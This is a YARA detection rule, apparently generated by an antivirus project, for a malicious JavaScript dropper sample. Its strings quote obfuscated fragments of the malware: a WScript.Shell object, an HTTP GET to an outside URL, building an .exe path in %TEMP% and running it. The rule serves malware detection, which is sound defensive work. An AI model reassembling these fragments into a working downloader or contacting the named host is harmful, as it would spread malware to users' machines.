rule sig_20160330_01ea054cb635400323e59832d177d73b {
  meta:
    description = "datamaliciousorder - file 20160330_01ea054cb635400323e59832d177d73b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e6d9a3511f13ef163442b565692cf641b3832b34e1aa0e0dbfa095a13bf1fbb7"

  strings:
    $s1  = "var _E = function _Z() {return WScript[_P0](\"WScript\"+\".Shell\");}(), _Q = 11;" fullword ascii
    $s2  = "_KN[_BS](\"GET\", \"http://zakazdetali.kz/v7bsad\", false);" fullword ascii
    $s3  = "if (_KN[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "function _H(){return _PU + \"\";};" fullword ascii
    $s5  = "function _P() {return _E[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"UiIrPNvy.ex\" + \"e\";};" fullword ascii
    $s6  = "function _M(_G, _CA){_N = _N * 1; return _G - _CA;};" fullword ascii
    $s7  = "function _XJ(_A){_E[\"Run\"](_A, _N, _N);};" fullword ascii
    $s8  = "function _W() {return ((_LE == true) && (_LE == _A0)) ? 1 : _N;};" fullword ascii
    $s9  = "function _MA()" fullword ascii
    $s10 = "function _I(){return _P0;};" fullword ascii
    $s11 = " while (_WD){" fullword ascii
    $s12 = "function _Z0(){return 22;};" fullword ascii
    $s13 = "function _QT(_S) {var _ZC = (1, 2, 3, 4, 5, _S); return _ZC;};" fullword ascii
    $s14 = "return _M(_Z1, _I1);" fullword ascii
    $s15 = "var _D0 = new this[\"Date\"]();" fullword ascii
    $s16 = "_LE = true; " fullword ascii
    $s17 = "_A0 = true; " fullword ascii
    $s18 = "var _LE = false;" fullword ascii
    $s19 = "var _A0 = false;" fullword ascii
    $s20 = "var _OC = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}